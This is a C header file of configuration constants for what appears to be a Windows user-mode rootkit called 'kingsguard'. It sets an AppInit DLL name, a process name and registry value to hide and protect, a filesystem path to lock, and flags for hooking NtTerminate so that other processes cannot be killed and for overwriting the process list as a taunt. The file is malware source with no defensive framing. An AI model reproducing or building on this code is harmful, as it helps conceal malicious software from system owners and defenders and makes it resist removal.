#define APPINIT L"appinit"

#define DLL L"kingsguard" // dll name
#define PROCESSA "ksguard" // Process name to hide / protect
#define PROCESSW L"ksguard" // Process name to hide / protect
#define KEY L"ksguard" // Reg value to hide / protect
#define PATH L"windows\\shellcomponents" // path to lock, but be careful - the search is for a substring. so for example, if this is set to C:\, the whole filesystem will locked.

#define TAUNT false // if true, overwrite process list with 'kingsguard'
#define NOTERM true // if true, NtTerminate hook prevents killing other processes